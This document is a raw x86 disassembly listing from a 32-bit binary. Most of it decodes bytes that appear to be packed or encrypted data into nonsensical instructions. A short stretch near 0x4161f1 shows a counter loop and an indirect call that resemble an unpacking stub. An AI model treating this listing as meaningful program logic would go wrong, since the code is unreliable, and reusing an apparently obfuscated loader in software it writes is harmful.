  415f71:	add    esp,ebx
  415f73:	imul   esp,DWORD PTR fs:[eax],0xfa72d01c
  415f7a:	sub    DWORD PTR ds:0xfdc9e3d5,edi
  415f80:	sahf   
  415f81:	dec    edi
  415f82:	mov    bl,0xe5
  415f84:	mov    ebx,0xb40c01cd
  415f89:	and    eax,0xcb3ff25f
  415f8e:	out    0xf1,al
  415f90:	add    eax,eax
  415f92:	fadd   DWORD PTR [ecx*4+0xa90faab]
  415f99:	loopne 0x415f63
  415f9b:	adc    ah,BYTE PTR [ebp+ebp*2+0x5]
  415f9f:	shr    BYTE PTR [edx],cl
  415fa1:	and    esp,esi
  415fa3:	mov    ds:0x10d07196,eax
  415fa8:	add    ch,BYTE PTR [ecx-0x3a]
  415fab:	scas   eax,DWORD PTR es:[edi]
  415fac:	add    esi,edx
  415fae:	sbb    eax,0x3fb2b827
  415fb3:	aaa    
  415fb4:	pop    ebp
  415fb5:	push   ecx
  415fb6:	fsub   QWORD PTR [edx]
  415fb8:	push   ds
  415fb9:	lahf   
  415fba:	scas   eax,DWORD PTR es:[edi]
  415fbb:	or     dl,BYTE PTR [ebx+0x16]
  415fbe:	(bad)  [edx-0x23]
  415fc1:	sbb    eax,0x17d0ff97
  415fc6:	retf   
  415fc7:	enter  0xd3d5,0xe6
  415fcb:	sub    eax,ecx
  415fcd:	cmp    al,0x6c
  415fcf:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415fd0:	shr    DWORD PTR [esi+0x16],1
  415fd3:	adc    BYTE PTR [edx+0x6bdb5324],0x90
  415fda:	pop    ecx
  415fdb:	aaa    
  415fdc:	sbb    al,0x65
  415fde:	jb     0x415fb7
  415fe0:	ds jbe 0x416028
  415fe3:	outs   dx,DWORD PTR ds:[esi]
  415fe4:	jmp    0x415f9f
  415fe6:	clc    
  415fe7:	in     al,0x64
  415fe9:	fidivr WORD PTR [edi]
  415feb:	jb     0x416065
  415fed:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415fee:	pop    esp
  415fef:	pop    ds
  415ff0:	mov    bh,0xd
  415ff2:	xchg   esi,eax
  415ff3:	add    dh,BYTE PTR [ebx+0x60]
  415ff6:	adc    esi,esp
  415ff8:	xchg   esp,eax
  415ff9:	inc    ebx
  415ffa:	imul   esp,eax,0x1
  415ffd:	inc    edi
  415ffe:	mov    eax,edx
  416000:	push   ebx
  416001:	xchg   ebp,eax
  416002:	ins    BYTE PTR es:[edi],dx
  416003:	mov    ebx,0x4fb11e6b
  416008:	(bad)  
  416009:	ffreep st(7)
  41600b:	hlt    
  41600c:	dec    eax
  41600d:	int    0x94
  41600f:	(bad)  
  416010:	pop    edx
  416011:	push   ds
  416012:	mov    ds:0x391fe3c,eax
  416017:	or     al,0xac
  416019:	mov    ecx,0x44c662b8
  41601e:	aam    0xa2
  416020:	test   DWORD PTR [ecx],ebp
  416022:	mov    ds:0xb1c4f01d,eax
  416027:	mov    DWORD PTR [edi+ebx*2],esp
  41602a:	cdq    
  41602b:	sub    dh,BYTE PTR [ebp-0x54]
  41602e:	mov    ebx,0x5e1f7d43
  416033:	sbb    eax,0xe55c0a54
  416038:	jle    0x41600f
  41603a:	arpl   WORD PTR [ebp-0x32],bx
  41603d:	hlt    
  41603e:	(bad)  
  41603f:	sbb    eax,0x8376d8f7
  416044:	sbb    al,0x66
  416046:	inc    ebx
  416047:	sbb    ecx,DWORD PTR [edx]
  416049:	popf   
  41604a:	mov    bh,0x96
  41604c:	arpl   ax,dx
  41604e:	jmp    0xa88405f9
  416053:	push   ebp
  416054:	out    0x73,eax
  416056:	nop
  416057:	cli    
  416058:	stos   DWORD PTR es:[edi],eax
  416059:	shl    BYTE PTR [ebx+eiz*8],0xc5
  41605d:	test   eax,0x2602dd6a
  416062:	add    eax,0x84990660
  416067:	fidiv  WORD PTR [esi+0x52]
  41606a:	pop    ds
  41606b:	and    al,0x7e
  41606d:	mov    eax,ds:0x722bd78f
  416072:	sbb    ch,BYTE PTR [edx-0x2d9fec3c]
  416078:	out    0xa9,al
  41607a:	mov    eax,ds:0xcf0ad33f
  41607f:	inc    ecx
  416080:	cmp    ebx,DWORD PTR [ebx]
  416082:	out    0x49,al
  416084:	in     al,0x1e
  416086:	jl     0x4160de
  416088:	adc    BYTE PTR [ebx+edx*2-0x46],bh
  41608c:	dec    eax
  41608d:	push   0x38
  41608f:	arpl   WORD PTR [ebp+0x41],di
  416092:	loope  0x4160b5
  416094:	inc    esi
  416095:	xchg   BYTE PTR [ebp-0x17179f32],dl
  41609b:	mov    dl,0xbe
  41609d:	pop    ebp
  41609e:	mov    DWORD PTR [ebp+0x79],edx
  4160a1:	aaa    
  4160a2:	pop    edi
  4160a3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4160a4:	(bad)  
  4160a5:	fidiv  DWORD PTR [esi+esi*1]
  4160a8:	pop    ecx
  4160a9:	sub    DWORD PTR [edi-0x76],edx
  4160ac:	sahf   
  4160ad:	into   
  4160ae:	fnstenv [ebx+0x36]
  4160b1:	push   ebx
  4160b2:	fsubr  QWORD PTR [edx-0x3b]
  4160b5:	enter  0x3fc4,0x11
  4160b9:	xor    bl,cl
  4160bb:	test   al,0x48
  4160bd:	sub    al,0x3e
  4160bf:	and    DWORD PTR [ecx+0x50081d23],0x44
  4160c6:	nop
  4160c7:	loopne 0x4160e5
  4160c9:	pop    ds
  4160ca:	arpl   di,bx
  4160cc:	pusha  
  4160cd:	aas    
  4160ce:	pop    esi
  4160cf:	call   0x4ab3:0x3a808e83
  4160d6:	rol    DWORD PTR [esi],cl
  4160d8:	add    al,0x55
  4160da:	push   esp
  4160db:	scas   eax,DWORD PTR es:[edi]
  4160dc:	ins    DWORD PTR es:[edi],dx
  4160dd:	scas   eax,DWORD PTR es:[edi]
  4160de:	push   esi
  4160df:	jge    0x41612c
  4160e1:	or     BYTE PTR [ebp-0x76],bl
  4160e4:	xor    al,0x65
  4160e6:	sbb    bh,BYTE PTR [ebx*8-0x1ce447e0]
  4160ed:	mov    WORD PTR [ebx+0x479b3969],?
  4160f3:	add    eax,DWORD PTR [ecx]
  4160f5:	push   edx
  4160f6:	pusha  
  4160f7:	fs mov WORD PTR gs:[edi-0x676cbadd],cs
  4160ff:	inc    esp
  416100:	stos   BYTE PTR es:[edi],al
  416101:	push   ds
  416102:	in     eax,0xcc
  416104:	into   
  416105:	mov    edi,0x758fc898
  41610a:	gs jnp 0x416135
  41610d:	loope  0x416124
  41610f:	adc    BYTE PTR [ebp+0x6807249d],cl
  416115:	stc    
  416116:	(bad)  
  416118:	ja     0x416188
  41611a:	push   ebx
  41611b:	and    eax,0xc49958d
  416120:	xchg   edx,eax
  416121:	aaa    
  416122:	scas   al,BYTE PTR es:[edi]
  416123:	daa    
  416124:	fsub   DWORD PTR [esi]
  416126:	xor    ebx,DWORD PTR [edi-0x1870fdd7]
  41612c:	aas    
  41612d:	dec    edi
  41612e:	push   es
  41612f:	add    eax,0xaed590c3
  416134:	push   esp
  416135:	jnp    0x4161b4
  416137:	adc    DWORD PTR [edx+eax*1],edx
  41613a:	pushf  
  41613b:	add    BYTE PTR ds:0xbfbc3a9b,0x89
  416142:	and    eax,0xf9281e3e
  416147:	(bad)  
  416148:	dec    ebp
  416149:	pop    es
  41614a:	inc    ebx
  41614b:	add    eax,0xe2fd036
  416150:	or     eax,0x1c71bd36
  416155:	xor    ebp,DWORD PTR [esi-0x16846e02]
  41615b:	or     DWORD PTR [ebx],ebp
  41615d:	cli    
  41615e:	mov    esp,0x17741aa3
  416163:	mov    esi,0x11a706a4
  416168:	dec    ecx
  416169:	sti    
  41616a:	inc    ecx
  41616b:	dec    ebx
  41616c:	jnp    0x41617f
  41616e:	jge    0x41617f
  416170:	mov    dl,0x93
  416172:	test   BYTE PTR [ebp-0x67],dh
  416175:	sbb    eax,0x9be2b3b6
  41617a:	lods   al,BYTE PTR ds:[esi]
  41617b:	fmul   st(6),st
  41617d:	(bad)  
  41617e:	cmp    DWORD PTR [ebx+0x3ced09a0],eax
  416184:	push   ds
  416185:	mov    dl,0x8a
  416187:	pop    eax
  416188:	ins    DWORD PTR es:[edi],dx
  416189:	mov    ecx,0xef525d4f
  41618e:	in     al,0x4
  416190:	xchg   ebp,eax
  416191:	jp     0x416142
  416193:	cmp    esp,DWORD PTR [ecx]
  416195:	or     al,0x4b
  416197:	push   es
  416198:	mov    dh,0x36
  41619a:	mov    esi,0xfc5a42d0
  41619f:	cld    
  4161a0:	pop    es
  4161a1:	sub    esp,ebx
  4161a3:	fs in  al,0x93
  4161a6:	daa    
  4161a7:	fwait
  4161a8:	sub    esp,DWORD PTR [eax+0x2b]
  4161ab:	rcl    DWORD PTR [ebx*2-0x1e8c2441],cl
  4161b2:	and    al,0x83
  4161b4:	pushf  
  4161b5:	cmc    
  4161b6:	and    eax,0x409ec264
  4161bb:	xchg   BYTE PTR [edx-0x44],dh
  4161be:	loop   0x416173
  4161c0:	mov    ebp,0x82a0d2b
  4161c5:	dec    edi
  4161c6:	mov    eax,0x39315392
  4161cb:	xor    DWORD PTR [ebp+0x7f],esp
  4161ce:	push   eax
  4161cf:	sub    edx,DWORD PTR [ebx]
  4161d1:	jmp    0x5ade:0x8f72ace8
  4161d8:	adc    BYTE PTR [esi],cl
  4161da:	xchg   esp,eax
  4161db:	push   0x71
  4161dd:	inc    ecx
  4161de:	or     esi,DWORD PTR [ebx]
  4161e0:	push   esp
  4161e1:	adc    edi,DWORD PTR gs:[eax-0x35]
  4161e5:	int3   
  4161e6:	leave  
  4161e7:	out    dx,al
  4161e8:	sub    ah,BYTE PTR [eax-0x663f8dbe]
  4161ee:	arpl   WORD PTR [ecx-0x51],sp
  4161f1:	mov    eax,DWORD PTR [ebp-0x4]
  4161f4:	mov    DWORD PTR ds:0x42a88d,0x1c
  4161fe:	cmp    DWORD PTR ds:0x42a88d,0x0
  416205:	je     0x41625b
  41620b:	cmp    DWORD PTR ds:0x42a88d,0xe
  416212:	jne    0x41622f
  416218:	push   0x7e45
  41621d:	push   DWORD PTR [ebp-0x1c]
  416220:	push   DWORD PTR [ebp-0xc]
  416223:	push   DWORD PTR [ebp-0x20]
  416226:	push   DWORD PTR [ebp-0x14]
  416229:	call   DWORD PTR ds:0x41d1f4
  41622f:	cmp    DWORD PTR ds:0x42a88d,0xf
  416236:	jne    0x416249
  41623c:	mov    edx,DWORD PTR ds:0x42a88d
  416242:	dec    edx
  416243:	mov    DWORD PTR ds:0x42a88d,edx
  416249:	mov    edx,DWORD PTR ds:0x42a88d
  41624f:	dec    edx
  416250:	mov    DWORD PTR ds:0x42a88d,edx
  416256:	jmp    0x4161fe
  41625b:	xor    eax,edi
  41625d:	add    eax,esi
  41625f:	add    DWORD PTR ds:0x42a769,edi
  416265:	push   eax
  416266:	push   DWORD PTR [ebp-0x8]
  416269:	push   DWORD PTR [ebp-0x4]
  41626c:	mov    edx,DWORD PTR ds:0x41eae6
  416272:	add    DWORD PTR ds:0x42a841,0x2531
  41627c:	jmp    0x416534
  416281:	ret    0x3fc0
  416284:	leave  
  416285:	leave  
  416286:	leave  
  416287:	retf   0x22c7
  41628a:	add    esp,DWORD PTR [ebx+0x31ed14ba]
  416290:	idiv   DWORD PTR [eax+ebx*1+0x7e95787f]
  416297:	js     0x416311
  416299:	(bad)  
  41629a:	out    0x30,al
  41629c:	inc    edx
  41629d:	dec    ecx
  41629e:	mov    esp,0x53d2fa82
  4162a3:	mov    edi,0x7f9552fa
  4162a8:	push   0xfffffffe
  4162aa:	and    DWORD PTR [esp+ecx*8-0x35a4450d],0x75
  4162b2:	cmp    BYTE PTR [ebx+0x40417244],ah
  4162b8:	fnsave [edx+0xb]
  4162bb:	xor    DWORD PTR [eax+edi*2-0x6be4244b],0xfffffff5
  4162c3:	ror    BYTE PTR [ecx],0x64
  4162c6:	inc    edx
  4162c7:	pop    ds
  4162c8:	pop    ebx
  4162c9:	cmp    ecx,DWORD PTR [edx]
  4162cb:	adc    BYTE PTR [eax-0x46],ch
  4162ce:	add    edi,DWORD PTR [esi]
  4162d0:	or     DWORD PTR [ecx-0x66076a44],esp
  4162d6:	ret    
  4162d7:	push   ebx
  4162d8:	pop    ebp
  4162d9:	cmp    eax,0x12feda43
  4162de:	cmc    
  4162df:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4162e0:	shl    BYTE PTR [ecx+0x41eb0734],1
  4162e6:	xchg   ecx,eax
  4162e7:	ret    0x54a
  4162ea:	or     DWORD PTR [esi+0x71],eax
  4162ed:	mov    cl,0xce
  4162ef:	push   ecx
  4162f0:	aad    0x39
  4162f2:	test   BYTE PTR [esi-0x39],dh
  4162f5:	mov    ds:0x94d3263b,al
  4162fa:	fidivr DWORD PTR [edi]
  4162fc:	xchg   esi,eax
  4162fd:	push   ds
  4162fe:	mov    ebp,0x87961442
  416303:	push   es
  416304:	aad    0x27
  416306:	xchg   esp,eax
  416307:	test   BYTE PTR [ecx],0xde
  41630a:	adc    al,0x2d
  41630c:	daa    
  41630d:	(bad)  
  41630e:	(bad)  
  41630f:	ds or  edi,0xffffffb8
  416313:	test   edi,0x28c0acf2
  416319:	sbb    ch,BYTE PTR es:[edx-0x62f65e6c]
  416320:	cmp    DWORD PTR [ecx-0x47],esp
  416323:	ss inc ecx
  416325:	test   ah,dh
  416327:	xchg   BYTE PTR [eax],bl
  416329:	(bad)  
  41632a:	pop    eax
  41632b:	jp     0x416331
  41632d:	jmp    0xd4e3:0x96c3ac24
  416334:	test   DWORD PTR ds:0x1a764f3e,edx
  41633a:	pop    es
  41633b:	out    0x27,al
  41633d:	dec    edx
  41633e:	test   DWORD PTR [ebp+eiz*8-0x8e588ff],eax
  416345:	jl     0x4162f4
  416347:	pop    ebx
  416348:	jmp    0x416372
  41634a:	retf   
  41634b:	or     eax,0x5ab842aa
  416350:	bound  edx,QWORD PTR [eax]
  416352:	mov    dh,BYTE PTR [ecx+0x6]
  416355:	jg     0x41632b
  416357:	fwait
  416358:	lea    edi,[eax+ebx*4-0x5da8990b]
  41635f:	dec    esi
  416360:	fisubr WORD PTR [esi+0x45]
  416363:	push   cs
  416364:	jmp    0x7d9b23ef
  416369:	leave  
  41636a:	mov    esp,edi
  41636c:	pusha  
  41636d:	mov    dl,0xa6
  41636f:	jns    0x416325
  416371:	es aaa 
  416373:	ret    
  416374:	add    ah,ch
  416376:	or     eax,0xae64ce96
  41637b:	jb     0x4163dc
  41637d:	mov    dl,0x7b
  41637f:	cld    
  416380:	ret    0xc1bd
  416383:	aas    
  416384:	add    DWORD PTR [edi+0x40],esp
  416387:	shr    DWORD PTR [ebp+0x22],0x7f
  41638b:	bound  esi,QWORD PTR [edx+0x31]
  41638e:	pusha  
  41638f:	lahf   
  416390:	sbb    BYTE PTR [edx+0x11],dl
  416393:	test   DWORD PTR [edi+0x57f44390],ecx
  416399:	std    
  41639a:	test   BYTE PTR [edx+0x21],bh
  41639d:	call   0x9e148f40
  4163a2:	stos   BYTE PTR es:[edi],al
  4163a3:	push   esp
  4163a4:	adc    BYTE PTR [ebx+0x325f934a],bh
  4163aa:	aam    0xac
  4163ac:	mov    ch,0xcb
  4163ae:	pop    eax
  4163af:	into   
  4163b0:	sahf   
  4163b1:	push   ecx
  4163b2:	out    0x4,eax
  4163b4:	mov    esp,0xd4df518a
  4163b9:	leave  
  4163ba:	push   ds
  4163bb:	xor    dh,BYTE PTR [edx]
  4163bd:	sti    
  4163be:	lahf   
  4163bf:	mov    ebx,0x2a4468fc
  4163c4:	sub    al,0xf1
  4163c6:	cli    
  4163c7:	cld    
  4163c8:	and    ecx,eax
  4163ca:	dec    edi
  4163cb:	fistp  WORD PTR [edx]
  4163cd:	sti    
  4163ce:	sar    BYTE PTR [ecx+0x716b6ca2],cl
  4163d4:	pop    edx
  4163d5:	xor    BYTE PTR [esi],dl
  4163d7:	dec    esp
  4163d8:	cmp    DWORD PTR [ebx-0x117f62cf],edx
  4163de:	jns    0x416448
  4163e0:	inc    ebp
  4163e1:	add    esi,DWORD PTR [edx]
  4163e3:	stos   DWORD PTR es:[edi],eax
  4163e4:	nop
  4163e5:	es (bad) 
  4163e8:	test   eax,0xd82550fe
  4163ed:	mov    esi,0x72a98503
  4163f2:	rcpps  xmm7,XMMWORD PTR [esi+0x3a5a0d17]
  4163f9:	jbe    0x416447
  4163fb:	inc    edi
  4163fc:	xor    ch,dl
  4163fe:	iret   
  4163ff:	mov    ebx,0xb5ddca54
  416404:	sub    al,0xfc
  416406:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416407:	mov    cl,0x4f
  416409:	jns    0x41638f
  41640b:	sbb    DWORD PTR [edi-0x385a1200],esp
  416411:	mov    ch,ah
  416413:	mov    ds:0x810c0660,al
  416418:	jl     0x416456
  41641a:	ja     0x4163ff
  41641c:	ja     0x4163cf
  41641e:	out    0x51,al
  416420:	lock xchg DWORD PTR [edi+eax*2],esi
  416424:	ror    cl,cl
  416426:	(bad)  
  416427:	jb     0x41644d
  416429:	dec    ecx
  41642a:	ds xchg esp,eax
  41642c:	loop   0x4163d7
  41642e:	aas    
  41642f:	pop    eax
  416430:	in     eax,dx
  416431:	dec    ebx
  416432:	or     cl,bh
  416434:	mov    ds:0xf7dcfedc,al
  416439:	add    DWORD PTR [edx+0x2bf8d230],ebp
  41643f:	add    DWORD PTR [esi],ebx
  416441:	lea    ebp,[esi+0x7a0d3c2e]
  416447:	cmp    eax,DWORD PTR [eax+0xd]
  41644a:	std    
  41644b:	dec    edx
  41644c:	mov    edi,0xe46b1713
  416451:	sub    al,0xae
  416453:	mov    ds,WORD PTR [eax+0x29]
  416456:	xchg   edx,eax
  416457:	push   0xffffffea
  416459:	pop    edi
  41645a:	fild   QWORD PTR [ebp-0x29]
  41645d:	adc    cl,BYTE PTR [esp+ebx*1+0xf]
  416461:	sti    
  416462:	stc    
  416463:	in     eax,0x9e
  416465:	dec    esi
  416466:	lahf   
  416467:	repz int3 
  416469:	pop    eax
  41646a:	into   
  41646b:	arpl   WORD PTR [edx],cx
  41646d:	scas   eax,DWORD PTR es:[edi]
  41646e:	pop    edx
  41646f:	jbe    0x41648b
  416471:	jbe    0x4164d5
  416473:	arpl   WORD PTR [ebp+0x5f],dx
  416476:	nop
  416477:	push   es
  416478:	fbstp  TBYTE PTR [ebp+0x7fc13ad0]
  41647e:	(bad)  
  41647f:	mov    ebp,DWORD PTR [eax-0x57]
  416482:	mov    ds:0xc05e6eb9,eax
  416487:	or     BYTE PTR [esi],al
  416489:	and    eax,0x30bbec1a
  41648e:	inc    esp
  41648f:	pop    ecx
  416490:	pop    ebx
  416491:	cdq    
  416492:	pop    ebx
  416493:	hlt    
  416494:	xor    ah,ah
  416496:	mov    BYTE PTR [edi-0x3c],al
  416499:	mov    cs,WORD PTR [edi-0x150f1b44]
  41649f:	mov    ds:0xb649fe6d,al
  4164a4:	mov    bh,0x50
  4164a6:	dec    esp
  4164a7:	adc    edi,ebx
  4164a9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4164aa:	mov    cl,0xd2
  4164ac:	add    al,0xfa
  4164ae:	popa   
  4164af:	aaa    
  4164b0:	mov    ch,0xc7
  4164b2:	xchg   esi,eax
  4164b3:	mov    esi,0x8900e187
  4164b8:	add    al,0x87
  4164ba:	retf   
  4164bb:	aam    0x4
  4164bd:	push   esp
  4164be:	adc    BYTE PTR [ebx-0x56],ch
  4164c1:	out    0xe2,al
  4164c3:	idiv   edi
  4164c5:	mov    bh,0xd6
  4164c7:	call   0x6ac2:0xf1ad0a8a
  4164ce:	repz inc eax
  4164d0:	cli    
  4164d1:	call   0xc88:0xc2bfa7c6
  4164d8:	ret    
  4164d9:	pop    esp
  4164da:	cmp    DWORD PTR [esp+eiz*8+0x14b2314f],0xffffffbc
  4164e2:	call   0xc239410b
  4164e7:	dec    edi
  4164e8:	and    DWORD PTR [edi],ebp
  4164ea:	sub    edx,ebp
  4164ec:	sbb    edx,DWORD PTR [esi-0x4ccf1f97]
  4164f2:	lea    esp,[eax+0x52]
  4164f5:	bound  ebp,QWORD PTR [edi-0x7c0874aa]
  4164fb:	popf   
  4164fc:	pop    edi
  4164fd:	fwait
  4164fe:	or     eax,0x50970e32
  416503:	ret    0xba2d
  416506:	sub    dh,0xf3
  416509:	loop   0x41656c
  41650b:	sub    eax,0x75383276
  416510:	push   ebp
  416511:	dec    edx
  416512:	or     BYTE PTR [edi],0x5b
  416515:	(bad)  
  416516:	push   ebx
  416517:	pop    es
  416518:	add    esp,DWORD PTR [ecx-0x5dce4558]
  41651e:	jae    0x416595
  416520:	cli    
  416521:	sti    
  416522:	in     eax,dx
  416523:	sbb    al,0x76
  416525:	pop    eax
  416526:	je     0x152b39df
  41652c:	adc    DWORD PTR ds:0xed61bf4b,edx
  416532:	cmp    ch,BYTE PTR [ebp+0x1832e8]
  416538:	add    BYTE PTR [ebx+0x41eae60d],cl
  41653e:	add    BYTE PTR [ebx+0x1cc89],cl
  416544:	add    cl,ch
  416546:	mov    bl,0x2
  416548:	add    BYTE PTR [eax],al
  41654a:	ret    
  41654b:	int3   
  41654c:	(bad)  
  41654d:	int3   
  41654e:	aad    0xda
  416550:	leave  
  416551:	rol    DWORD PTR [ebp+0x6ce37c66],cl
  416557:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416558:	ds ins BYTE PTR es:[edi],dx
  41655a:	fstp   DWORD PTR ds:0x7e95787f
  416560:	js     0x4165da
  416562:	or     al,0xa2
  416564:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416565:	add    al,0x12
  416567:	movzx  edi,BYTE PTR [ecx]
  41656a:	sbb    DWORD PTR [eax],esi
  41656c:	inc    eax
  41656d:	and    al,0xd0
  41656f:	ins    DWORD PTR es:[edi],dx
  416570:	jb     0x41651f
  416572:	lods   al,BYTE PTR ds:[esi]
  416573:	std    
  416574:	dec    edi
  416575:	and    BYTE PTR [ecx+0x5271a011],dl
  41657b:	in     al,0xf0
  41657d:	or     eax,0x661bcb57
  416582:	mov    edi,0x41e72167
  416587:	jp     0x416570
  416589:	imul   ebp,DWORD PTR [edi],0x9f7830b2
  41658f:	mov    WORD PTR [eax+0x56],es
  416592:	hlt    
  416593:	adc    al,0x20
  416595:	mov    ds:0xdadc41a4,al
  41659a:	lds    ebp,FWORD PTR [ebx+0xd891932]
  4165a0:	sar    dl,0x4e
  4165a3:	inc    edi
  4165a4:	lock dec eax
  4165a6:	cmp    eax,0xee2484ed
  4165ab:	mov    dl,BYTE PTR [ebp-0x55]
  4165ae:	test   cl,ch
  4165b0:	sbb    edx,DWORD PTR [eax-0x13d29f3]
  4165b6:	mov    ecx,0xa123bab7
  4165bb:	mov    edi,0xee45ca0e
  4165c0:	mov    ebx,0xd87a8d12
  4165c5:	dec    ebp
  4165c6:	loope  0x416609
  4165c8:	dec    eax
  4165c9:	xchg   edx,eax
  4165ca:	pushf  
  4165cb:	add    cl,bh
  4165cd:	mov    ds,edi
  4165cf:	adc    al,0xbb
  4165d1:	push   edi
  4165d2:	dec    ebx
  4165d3:	(bad)  
  4165d5:	xchg   DWORD PTR [eax-0x2f],esp
  4165d8:	jmp    0x4165ef
  4165da:	out    0x4,eax
  4165dc:	sub    dh,BYTE PTR [edi+eiz*8+0x76]
  4165e0:	and    cl,BYTE PTR [ebx]
  4165e2:	pop    edx
  4165e3:	(bad)  
  4165e4:	mov    DWORD PTR [ebp-0x7db13efd],esp
  4165ea:	mov    esp,0xa1d4949e
  4165ef:	pop    edi
  4165f0:	add    BYTE PTR [edi],bh
  4165f2:	mov    eax,0xfbc04136
  4165f7:	iret   
  4165f8:	cmc    
  4165f9:	cs fsub st(1),st
  4165fc:	dec    edi
  4165fd:	fwait
  4165fe:	add    BYTE PTR [ecx-0x7c466192],dh
  416604:	(bad)  
  416605:	ss inc ebx
  416607:	and    eax,0xc07747b9
  41660c:	dec    eax
  41660d:	shl    DWORD PTR [eax],1
  41660f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416610:	jb     0x41659b
  416612:	stos   DWORD PTR es:[edi],eax
  416613:	xchg   edx,eax
  416614:	dec    ebx
  416615:	adc    al,0x83
  416618:	mov    ss,edx
  41661a:	jb     0x416636
  41661c:	adc    eax,0xb46e8225
  416621:	mov    bh,0xd7
  416623:	sbb    eax,0x2fe5757d
  416628:	adc    ah,ch
  41662a:	sbb    eax,DWORD PTR [edi-0x68]
  41662d:	lods   eax,DWORD PTR ds:[esi]
  41662e:	pop    ebx
  41662f:	adc    DWORD PTR [esi+0x76],ebx
  416632:	pop    ecx
  416633:	sahf   
  416634:	pop    esp
  416635:	fs repnz push 0x73927fae
  41663c:	fsub   QWORD PTR [eax-0x3802fd17]
  416642:	xchg   ecx,eax
  416643:	test   eax,0x1d2f36cc
  416648:	stc    
  416649:	pop    edx
  41664a:	sbb    DWORD PTR [eax-0x24],esp
  41664d:	push   ebp
  41664e:	fwait
  41664f:	cli    
  416650:	xchg   ebx,eax
  416651:	xchg   ecx,eax
  416652:	sbb    edi,eax
  416654:	outs   dx,BYTE PTR ds:[esi]
  416655:	xchg   edi,eax
  416656:	stos   BYTE PTR es:[edi],al
  416657:	jmp    0xd1a6:0x8d45498d
  41665e:	xor    ch,bl
  416660:	inc    ecx
  416661:	and    al,0xe5
  416663:	scas   al,BYTE PTR es:[edi]
  416664:	pop    ds
  416665:	pusha  
  416666:	pop    edx
  416667:	add    eax,0x40fd9066
  41666c:	mov    ebx,0x3186c1b9
  416671:	adc    BYTE PTR ds:0xf3bed563,dl
  416677:	hlt    
  416678:	jp     0x4166e4
  41667a:	cs push 0x7e
  41667d:	mov    ds:0x75afb8da,eax
  416682:	jb     0x416609
  416684:	push   ecx
  416685:	add    eax,0x87203877
  41668a:	or     eax,0x8e3630bc
  41668f:	inc    eax
  416690:	clc    
  416691:	cmp    ebx,DWORD PTR [esi]
  416693:	sbb    cl,dh
  416695:	mov    ds:0x7120937a,al
  41669a:	sub    eax,0x8596605f
  41669f:	lods   eax,DWORD PTR ds:[esi]
  4166a0:	sbb    bl,BYTE PTR [ecx+edx*1]
  4166a3:	adc    edx,DWORD PTR [edi+0x4ffc32f1]
  4166a9:	xor    BYTE PTR [edx],al
  4166ab:	sbb    eax,0x1e975623
  4166b0:	jb     0x416707
  4166b2:	jo     0x416697
  4166b4:	sbb    BYTE PTR ds:0xcabd8259,dl
  4166ba:	inc    ebx
  4166bb:	call   0x7a88:0x237ac634
  4166c2:	inc    edi
  4166c3:	adc    al,bh
  4166c5:	cmp    al,0xe1
  4166c7:	dec    ecx
  4166c8:	add    BYTE PTR fs:[edx-0xa896ce0],bl
  4166cf:	sbb    DWORD PTR [ebp-0x58],ebp
  4166d2:	sub    esi,DWORD PTR [ebx-0x48f03553]
  4166d8:	push   cs
  4166d9:	outs   dx,BYTE PTR gs:[esi]
  4166db:	aad    0x9b
  4166dd:	adc    al,0xc2
  4166df:	or     DWORD PTR [esi+eax*8],edx
  4166e2:	add    bh,ah
  4166e4:	xchg   esp,eax
  4166e5:	ja     0x41666e
  4166e7:	call   DWORD PTR [eax]
  4166e9:	fistp  QWORD PTR [ebx+ecx*8+0x31fef8bb]
  4166f0:	fwait
  4166f1:	sub    BYTE PTR [esi-0x5],al
  4166f4:	push   cs
  4166f5:	mov    BYTE PTR [eax-0x1dd2b87e],bh
  4166fb:	adc    BYTE PTR [ecx],0xf6
  4166fe:	mov    edi,0x6805e769
  416703:	retf   
  416704:	push   ds
  416705:	or     ch,BYTE PTR [edi]
  416707:	(bad)  
  416709:	jl     0x41671f
  41670b:	test   eax,0x176674f7
  416710:	dec    ecx
  416711:	out    0xa3,al
  416713:	bound  edx,QWORD PTR [ebp-0x3d057bca]
  416719:	cwde   
  41671a:	nop
  41671b:	push   ebp
  41671c:	test   al,0x58
  41671e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41671f:	sbb    DWORD PTR [edx-0x58],esp
  416722:	pop    esi
  416723:	xchg   DWORD PTR [esi+edi*1+0x3d],edi
  416727:	repz xor eax,0xdc638781
  41672d:	cwde   
  41672e:	xchg   ebx,eax
  41672f:	jp     0x4166c9
  416731:	icebp  
  416732:	out    dx,al
  416733:	jnp    0x41670f
  416735:	cmp    DWORD PTR [edx],0x777373d7
  41673b:	bound  edx,QWORD PTR [ebx+0x5c]
  41673e:	push   ebx
  41673f:	mov    ds:0x90272b0b,al
  416744:	aaa    
  416745:	inc    edx
  416746:	pop    ebp
  416747:	loopne 0x4166f8
  416749:	(bad)  
  41674a:	cmp    esp,DWORD PTR ss:[edx+ebp*2]
  41674e:	ret    0xc594
  416751:	dec    edi
  416752:	fisttp WORD PTR [ecx]
  416754:	pushf  
  416755:	dec    esp
  416756:	jnp    0x4166df
  416758:	test   BYTE PTR [ebx],bh
  41675a:	stos   DWORD PTR es:[edi],eax
  41675b:	(bad)  
  41675c:	rcr    DWORD PTR [edx],0xb3
  41675f:	or     DWORD PTR [ebx],esi
  416761:	and    eax,0xa3b98b3
  416766:	jmp    0x736e:0x7ee03232
  41676d:	add    esi,DWORD PTR [eax]
  41676f:	aaa    
  416770:	lea    esi,[eax+0x5abaabaf]
  416776:	lea    edx,[esi-0x33]
  416779:	sub    al,0x25
  41677b:	es stos DWORD PTR es:[edi],eax
  41677d:	loopne 0x416741
  41677f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416780:	in     eax,dx
  416781:	(bad)  
  416782:	cli    
  416783:	mov    DWORD PTR [edx],0x390588bb
  416789:	mov    ds:0x34abf998,eax
  41678e:	data16 add BYTE PTR [ebp+0x431938a0],0xe7
  416796:	inc    edx
  416797:	mov    esi,0x4dffaa8e
  41679c:	jmp    0x98f8:0x396b3d1c
